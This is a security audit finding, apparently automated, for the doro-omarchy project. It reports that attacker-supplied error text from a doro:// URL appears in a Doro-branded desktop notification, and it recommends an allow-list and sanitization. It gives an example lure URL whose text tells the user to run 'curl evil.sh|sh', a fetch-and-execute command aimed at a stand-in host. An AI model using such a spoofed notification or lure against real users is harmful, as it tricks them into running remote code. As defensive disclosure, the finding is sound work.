# [MEDIUM] Attacker-controlled text rendered in a Doro-branded desktop notification

**File:** [`Nube.qml`](https://github.com/daniace/doro-omarchy/blob/main/Nube.qml#L172-L173) (lines 172, 173)
**Project:** doro-omarchy
**Severity:** MEDIUM  •  **Confidence:** medium  •  **Slug:** `other-notification-spoofing`

## Owners

**Suggested assignee:** `daniel.emiliano.acevedo@gmail.com` _(via last-committer)_

## Finding

On the callback error path, `retorno.error` is `datos.error_description` taken verbatim from the attacker-supplied URL (Supabase.js:122-123) and is passed as the notification body: `root.aviso(t("aviso.noSePudoEntrar"), ... : retorno.error)` (L173) -> `Service.notificar` -> `omarchy-notification-send --app-name Doro --image <doro icon> <titulo> <cuerpo>` (Service.qml:206). Any web page (or local process) can therefore render arbitrary text in a notification that carries Doro's name and logo, e.g. `doro://auth?error_code=x&error_description=Your%20Doro%20session%20expired,%20run:%20curl%20evil.sh|sh`. There is no length cap and no sanitization; freedesktop notification daemons also interpret a markup subset in the body, which can add emphasis or links to the lure. The argv array prevents command injection — the issue is purely the trusted-UI spoofing primitive, which pairs naturally with the session-fixation flaw above.

## Recommendation

Never surface remote/`doro://`-supplied strings in notifications. Map `retorno.codigo` through the existing `motivos` allow-list and fall back to a generic localized message for unknown codes instead of printing `retorno.error`. If the raw provider text is wanted for debugging, send it to `console.warn` only, and truncate plus strip markup characters.

## Recent committers (`git log`)

- Daniel Emiliano Acevedo <daniel.emiliano.acevedo@gmail.com> (2026-10-27)
